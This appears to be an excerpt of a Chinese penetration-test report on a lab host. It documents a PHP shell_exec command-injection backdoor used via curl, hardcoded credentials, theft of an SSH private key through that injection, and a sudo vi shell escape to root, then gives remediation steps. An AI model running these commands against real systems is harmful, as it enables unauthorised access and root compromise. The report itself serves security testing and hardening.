二、漏洞发现与利用

2.1 命令执行漏洞 (Critical)

漏洞位置： http://10.49.185.101/home.php

漏洞类型： 任意命令执行（RCE）

漏洞代码（index.php.bak）：

<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>

利用方式：

# 执行系统命令
curl -s -X POST http://10.49.185.101/home.php -d "command=id"
# 返回: uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)

curl -s -X POST http://10.49.185.101/home.php -d "command=whoami"
# 返回: www-data

curl -s -X POST http://10.49.185.101/home.php -d "command=ls -la"

危害： 攻击者可以 www-data 身份执行任意系统命令，完全控制 Web 服务器。

当前用户权限：

uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)

www-data 属于 root、sudo、lxd 组，权限极高。

2.2 硬编码凭据泄露 (High)

漏洞位置： http://10.49.185.101/validate.php

漏洞类型： 凭据硬编码

漏洞代码：

<?php
    $uname=$_POST['uname'];
    $password=$_POST['password'];
    if($uname=="charlie" && $password=="cn7824"){
        echo "<script>window.location='home.php'</script>";
    }
    else{
        echo "<script>alert('Incorrect Credentials');</script>";
        echo "<script>window.location='index.html'</script>";
    }
?>

泄露凭据：

用户名 密码
charlie cn7824

利用方式：

通过命令执行读取 validate.php 源码：

curl -s -X POST http://10.49.185.101/home.php -d "command=cat validate.php"

或者直接使用泄露的凭据登录系统：

# SSH 登录（需配合 SSH 私钥）
ssh -i charlie_teleport charlie@10.49.185.101

2.3 敏感文件泄露 (High)

漏洞位置： Web 根目录

泄露文件列表：

文件 内容 危害
validate.php 登录验证源码 泄露硬编码凭据
index.php.bak home.php 的备份源码 确认命令执行漏洞
key_rev_key ELF 二进制文件 包含 Fernet 加密密钥
.swp Vim 交换文件 可能泄露编辑历史

key_rev_key 分析：

# 下载并分析二进制文件

2.4 SSH 私钥泄露 (Critical)

漏洞位置： /home/charlie/teleport

漏洞类型： 私钥文件权限过宽

文件权限：

-rw-r--r-- charlie charley 1675 teleport
-rw-r--r-- charlie charley  407 teleport.pub

私钥文件权限为 644（所有人可读），应为 600。

利用方式：

# 通过命令执行获取私钥
curl -s -X POST http://10.49.185.101/home.php -d "command=cat /home/charlie/teleport"

# 保存为本地文件
cat > charlie_teleport << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[私钥内容]
-----END RSA PRIVATE KEY-----
EOF
chmod 600 charlie_teleport

# SSH 登录
ssh -i charlie_teleport charlie@10.49.185.101

2.5 Sudo 提权配置不当 (Critical)

漏洞位置： /etc/sudoers

漏洞类型： sudo 配置允许 vi 以 root 身份执行

sudo -l 输出：

User charlie may run the following commands on ip-10-49-185-101:
    (ALL : !root) NOPASSWD: /usr/bin/vi

分析：

  • NOPASSWD：无需密码
  • /usr/bin/vi：vim 编辑器支持 :! 执行 shell 命令
  • 虽然限制了 !root 组，但仍可以 root 用户身份运行

利用方式：

# 通过 vi 执行任意命令
sudo /usr/bin/vi -c ':!whoami' -c ':q!'

# 读取 root 目录文件
sudo /usr/bin/vi -c ':!cat /root/root.py' -c ':q!'

# 执行 root 目录下的脚本
sudo /usr/bin/vi -c ':!python3 /root/root.py' -c ':q!'

六、修复建议

6.1 命令执行漏洞

问题： 用户输入直接传递给 shell_exec() 执行。

修复：

<?php
// 方案1：使用白名单
$allowed_commands = ['date', 'uptime', 'df'];
if (isset($_POST['command']) && in_array($_POST['command'], $allowed_commands)) {
    echo shell_exec($_POST['command']);
}

// 方案2：移除命令执行功能
// home.php 不应该包含命令执行功能
?>

6.2 硬编码凭据

问题： 用户名密码直接写在 PHP 源码中。

修复：

<?php
// 使用数据库存储凭据，密码使用 password_hash() 加密
$uname = $_POST['uname'];
$password = $_POST['password'];

// 从数据库获取用户
$stmt = $pdo->prepare("SELECT password_hash FROM users WHERE username = ?");
$stmt->execute([$uname]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password_hash'])) {
    // 登录成功
}
?>

6.3 敏感文件保护

问题： .bak、.swp、二进制文件暴露在 Web 目录。

修复：

# .htaccess
<FilesMatch "\.(bak|swp|old|tmp|sql|log)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# 或在 Apache 配置中
<Directory /var/www/html>
    <FilesMatch "\.(bak|swp|old|tmp)$">
        Require all denied
    </FilesMatch>
</Directory>

6.4 SSH 私钥权限

问题： 私钥文件权限为 644（所有人可读）。

修复：

# 设置正确权限
chmod 600 /home/charlie/teleport
chown charlie:charlie /home/charlie/teleport

6.5 Sudo 配置

问题： vi 编辑器可以执行 shell 命令，且配置了 NOPASSWD。

修复：

# 方案1：移除 sudo 权限
# /etc/sudoers
# charlie ALL=(ALL : !root) NOPASSWD: /usr/bin/vi

# 方案2：使用受限的编辑器
charlie ALL=(root) NOPASSWD: /usr/bin/rnano

# 方案3：如果必须使用 vi，限制命令
charlie ALL=(root) NOPASSWD: /usr/bin/vi /etc/config/*

6.6 密钥管理

问题： Fernet 密钥可以从其他文件中提取。

修复：

  • 将密钥存储在环境变量或密钥管理服务中
  • 不要将密钥硬编码在可被访问的文件中
  • 使用 HSM 或云密钥管理服务
